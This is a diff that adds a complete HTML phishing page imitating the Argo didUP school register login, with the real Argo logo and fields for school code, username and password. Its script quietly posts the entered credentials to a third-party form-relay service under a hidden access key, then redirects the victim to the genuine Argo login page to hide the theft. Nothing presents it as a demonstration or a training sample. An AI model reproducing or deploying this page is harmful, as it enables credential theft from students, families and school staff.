@@ -1,0 +1,22 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Login Argo didUP</title><style>
+body{margin:0;font-family:Arial;background:#eef1f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.b{background:#fff;padding:25px;border-radius:10px;width:300px}
+input{width:100%;padding:11px;margin-bottom:10px;box-sizing:border-box;border:1px solid #ccc;border-radius:5px}
+button{width:100%;padding:12px;background:#1b5e9c;color:#fff;border:0;border-radius:5px;font-size:15px}
+img{max-width:140px;display:block;margin:0 auto 15px}
+</style></head><body><div class="b">
+<img src=https://cdnaws.portaleargo.it/portale/images/icone/didup.png><form id="f">
+<input type="hidden" name="access_key" value=110cf273-d902-432d-97ac-6d0bd39b7a3c>
+<input name="scuola" placeholder="Codice scuola">
+<input name="utente" placeholder="Nome utente">
+<input name="password" type="password" placeholder="Password">
+<button>Accedi</button></form></div>
+<script>
+f.onsubmit=async e=>{e.preventDefault();
+let d=Object.fromEntries(new FormData(f));
+try{await fetch('https://api.web3forms.com/submit',{method:'POST',
+headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})}catch(x){}
+location='https://www.portaleargo.it/areautenti/'};
+</script></body></html>
